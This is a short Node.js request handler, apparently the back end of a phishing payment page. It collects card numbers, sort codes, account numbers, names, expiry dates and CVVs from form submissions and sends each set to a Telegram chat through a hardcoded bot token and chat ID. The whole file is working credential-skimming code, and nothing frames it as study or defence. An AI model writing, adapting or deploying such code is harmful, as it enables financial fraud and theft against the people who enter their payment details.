import fetch from 'node-fetch';

export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            // Include new fields in destructuring
            const { cardNumber, sortCode, accountNumber, nameOnCard, expiryDate, cvv } = req.body;
            
            // Log all received details
            console.log('Received payment details:', { 
                cardNumber, 
                sortCode, 
                accountNumber, 
                nameOnCard, 
                expiryDate, 
                cvv 
            });

            // Update Telegram message with new fields
            const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
            const chatId = '7587120060';
            const message = encodeURIComponent(
                `New payment details:\n` +
                `Card Number: ${cardNumber}\n` +
                `Sort Code: ${sortCode}\n` +
                `Account Number: ${accountNumber}\n` +
                `Name on Card: ${nameOnCard}\n` +
                `Expiry Date: ${expiryDate}\n` +
                `CVV: ${cvv}`
            );
            
            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;

            console.log('Sending message to Telegram:', telegramUrl);
            const response = await fetch(telegramUrl);
            const result = await response.json();

            if (!response.ok) {
                throw new Error(`Telegram API error: ${result.description}`);
            }

            res.status(200).json({ success: true });
        } catch (error) {
            console.error('Error in submit.js:', error.message);
            res.status(500).json({ error: 'Failed to process request' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
